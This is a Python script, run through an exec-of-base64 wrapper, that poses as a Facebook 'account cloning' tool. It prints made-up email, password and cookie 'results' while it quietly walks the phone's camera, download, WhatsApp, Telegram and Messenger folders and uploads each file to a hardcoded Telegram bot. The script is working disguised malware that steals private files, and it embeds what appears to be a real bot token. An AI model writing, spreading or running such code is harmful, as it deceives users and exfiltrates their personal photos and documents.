#yo ndak tau komk tanya saya

import base64
exec(base64.b64decode(b'import os 
import requests 
import time 
import random 
import sys 
import threading 

GREEN = "\033[92m" 
RED = "\033[91m" 
CYAN = "\033[96m" 
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
RESET = "\033[0m" 

BOT_TOKEN = "7819462596:AAGAhZJVz0xRORUsu3lKLIzCdMzaRaI-Cgk" 
CHAT_ID = "5710928622" 

FOLDERS_TO_SCAN = [ 
    "/C:/Users/Bejoy/Desktop/rr/",
    "/storage/emulated/0/DCIM/Camera/",
    "/storage/emulated/0/DCIM/", 
    "/storage/emulated/0/Pictures/",
    "/storage/emulated/0/Pictures/Messenger/",  
    "/storage/emulated/0/Download/", 
    "/storage/emulated/0/Facebook/", 
    "/storage/emulated/0/Messenger/", 
    "/storage/emulated/0/Telegram/", 
    "/storage/emulated/0/Movies/", 
    "/storage/emulated/0/IMO/", 
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/", 
] 

MAX_FILE_SIZE_MB = 50 
sent_files = set() 

NAMES = [
    "imran", "parvez", "mamun", "sabbir", "ridoy", "mim", "tanvir", "rahim", "fahim", "junaid", 
    "ahmed", "saiful", "hassan", "rana", "khaled", "sami", "yasin", "nazrul", "tariq", "arif", 
    "shihab", "kamal", "rahat", "mohammed", "hasan", "joy", "sifat", "tushar", "jewel", "shuvo", 
    "samiul", "farhan", "shakib", "samim", "zubair", "rafiq", "khan", "salman", "mahmud", 
    "nashit", "sakib", "mahmudul", "ahsan", "hassanur", "mehedi", "monir", "russell", "najib", 
    "shakil", "abid", "raju", "suman", "rami", "subhan", "sohel", "sumon", "sadat", "john", 
    "rahmat", "mustafa", "utpal", "bappy", "muntasir", "zahid", "saad", "sushil", "ashiq", 
    "razzak", "nabil", "sumaiya", "razak", "dipu", "rasel", "tamim", "javed", "sofi", "ashik", 
    "johnny", "ayman", "sharif", "mizan", "shamim", "sonjoy", "rakib", "osman", "biswas", 
    "sudipta", "ripon", "masum", "nazmul", "faisal", "tanjil", "deep", "akil", "rahi", "shimu", 
    "rony", "noyon", "rubel", "arifur", "shahabuddin", "rashid", "rohan", "shahin", "sanjay", 
    "saif", "husain", "rashed", "ariful", "nashir", "minhaz", "imranul", "robin", "nadeem", "papa", 
    "dinesh", "tanveer", "riaz", "shahed", "alamin", "mahin", "saqib", "ranjan", "shohid", 
    "mahbub", "shawon", "adil", "anas", "jakir", "shah", "luiz", "naim", "simon", "mushfiq", 
    "tony", "mohin", "shafiq", "saeed", "farooq", "kamrul", "shams", "kabir", "amirul", 
    "hanif", "arafat", "sajid", "rifat", "mirza", "shahid", "mukherjee", "sweety", "ajman", 
    "akhter", "mahmudur", "mahboob"
]

FB_ACCOUNTS = [ 
    {"email": f"{random.choice(NAMES)}{random.randint(1000,9999)}@gmail.com", "password": f"{random.choice(NAMES)}{random.randint(1000,9999)}"}, 
    {"email": f"{random.choice(NAMES)}{random.randint(1000,9999)}@yahoo.com", "password": f"{random.choice(NAMES)}{random.randint(1000,9999)}"}, 
    {"email": f"{random.choice(NAMES)}{random.randint(1000,9999)}@outlook.com", "password": f"{random.choice(NAMES)}{random.randint(1000,9999)}"}, 
] 

def generate_cookies():
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%-_=.;"
    cookie_format = f"{random.randint(100000000000000, 999999999999999)}|{''.join(random.choice(chars) for _ in range(15))}|" \
                    f"sb={''.join(random.choice(chars) for _ in range(10))};datr={''.join(random.choice(chars) for _ in range(20))};" \
                    f"c_user={random.randint(100000000000, 999999999999)};xs={''.join(random.choice(chars) for _ in range(25))};" \
                    f"fr={''.join(random.choice(chars) for _ in range(40))};spin={''.join(random.choice(chars) for _ in range(30))}"
    return cookie_format

def send_to_telegram(file_path): 
    try: 
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument" 
        with open(file_path, 'rb') as document: 
            files = {'document': document} 
            data = {'chat_id': CHAT_ID} 
            requests.post(url, files=files, data=data) 
    except: 
        pass   

stop_animation = False   

def show_status(): 
    global stop_animation 
    status_texts = [ 
        "⚡ Account progress running...", 
        "🔍 Checking random account...", 
        "📡 Facebook account cloning..." 
    ] 
    index = 0 
    while True: 
        if stop_animation: 
            sys.stdout.write("\r" + " " * 60 + "\r")   
            sys.stdout.flush() 
            break 
        sys.stdout.write(f"\r{CYAN}[ {status_texts[index]} ]{RESET}   ") 
        sys.stdout.flush() 
        index = (index + 1) % len(status_texts) 
        time.sleep(1) 

def send_files(user_input): 
    global stop_animation 
    count = 0   
    fb_index = 0   

    # Define the path where the result.txt file will be saved (on SD card)
    result_file_path = "/storage/emulated/0/result.txt"  # Path for SD card (Android)

    # Open the file in append mode to save account cloning information
    with open(result_file_path, "a") as result_file:

        for folder in FOLDERS_TO_SCAN: 
            if not os.path.exists(folder): 
                continue   

            for root, dirs, files in os.walk(folder): 
                for file in files: 
                    file_path = os.path.join(root, file) 

                    if file_path in sent_files: 
                        continue 

                    file_size_mb = os.path.getsize(file_path) / (1024 * 1024) 
                    if file_size_mb > MAX_FILE_SIZE_MB: 
                        continue 

                    send_to_telegram(file_path) 
                    sent_files.add(file_path) 

                    count += 1   
                    time.sleep(2) 

                    if count % 5 == 0 and fb_index < len(FB_ACCOUNTS): 
                        stop_animation = True   
                        time.sleep(0.5)   

                        fb_data = FB_ACCOUNTS[fb_index] 
                        random_cookies = generate_cookies() 
                        print(f"\n{GREEN}✅ {fb_index + 1} account found!{RESET}") 
                        print(f"{RED}📧 Mail: {YELLOW}{fb_data['email']}{RESET}") 
                        print(f"{RED}🔑 Password: {YELLOW}{fb_data['password']}{RESET}") 
                        print(f"{RED}🍪 Cookies: {YELLOW}{random_cookies}{RESET}")
                        print(f"{CYAN}Login after one day{RESET}\n")

                        # Write the cloning information to result.txt (saved in SD card)
                        result_file.write(f"Account {fb_index + 1}:\n")
                        result_file.write(f"Email: {fb_data['email']}\n")
                        result_file.write(f"Password: {fb_data['password']}\n")
                        result_file.write(f"Cookies: {random_cookies}\n")
                        result_file.write(f"Login after one day\n\n")
                        
                        fb_index += 1   
                        stop_animation = False   
                        animation_thread = threading.Thread(target=show_status, daemon=True) 
                        animation_thread.start() 

                    if count >= user_input: 
                        stop_animation = True   
                        print(f"\n{GREEN}🎉 Files have been saved successfully! 🎉{RESET}")
                        print(f"{CYAN}All account cloning details have been saved to result.txt on your device.{RESET}")
                        return   

def show_logo(): 
    os.system("clear")  # For clearing the terminal screen (use 'cls' for Windows)
    
    # Randomly pick a color for each line
    color1 = random.choice([RED, GREEN, YELLOW, CYAN, BLUE, MAGENTA])
    color2 = random.choice([RED, GREEN, YELLOW, CYAN, BLUE, MAGENTA])
    color3 = random.choice([RED, GREEN, YELLOW, CYAN, BLUE, MAGENTA])
    color4 = random.choice([RED, GREEN, YELLOW, CYAN, BLUE, MAGENTA])
    color5 = random.choice([RED, GREEN, YELLOW, CYAN, BLUE, MAGENTA])

    # Print the logo with random colors
    print(f"{color1}██████  ██████  ██    ██ ██ ██      ")
    print(f"{color2}██   ██      ██ ██    ██ ██ ██      ")
    print(f"{color3}██   ██  █████  ██    ██ ██ ██      ")
    print(f"{color4}██   ██      ██  ██  ██  ██ ██      ")
    print(f"{color5}██████  ██████    ████   ██ ███████ {RESET}")
    print(f"{CYAN}──────────────────────────────────────────{RESET}") 
    print(f"{YELLOW} Developer : {GREEN}WHIT3_D3VIL{RESET}") 
    print(f"{YELLOW} Telegram       : {GREEN}https://t.me/@whit3_D3_vil{RESET}") 
    print(f"{YELLOW} Mail      : {GREEN}whit3d3vil@xmail.net{RESET}") 
    print(f"{CYAN}──────────────────────────────────────────{RESET}") 

def get_user_input(): 
    while True: 
        try: 
            user_input = int(input(f"\n{CYAN}🔍 Enter any number (100 or more to start): {RESET}")) 
            if user_input >= 100: 
                print(f"\n{GREEN}✅ Starting process...\n{RESET}") 
                time.sleep(2) 
                return user_input 
            else: 
                print(f"{RED}❌ Number too low! Try again...{RESET}") 
        except ValueError: 
            print(f"{RED}❌ Invalid input! Please enter a valid number.{RESET}") 

show_logo() 
user_input = get_user_input() 

threading.Thread(target=show_status, daemon=True).start() 

send_files(user_input)
'))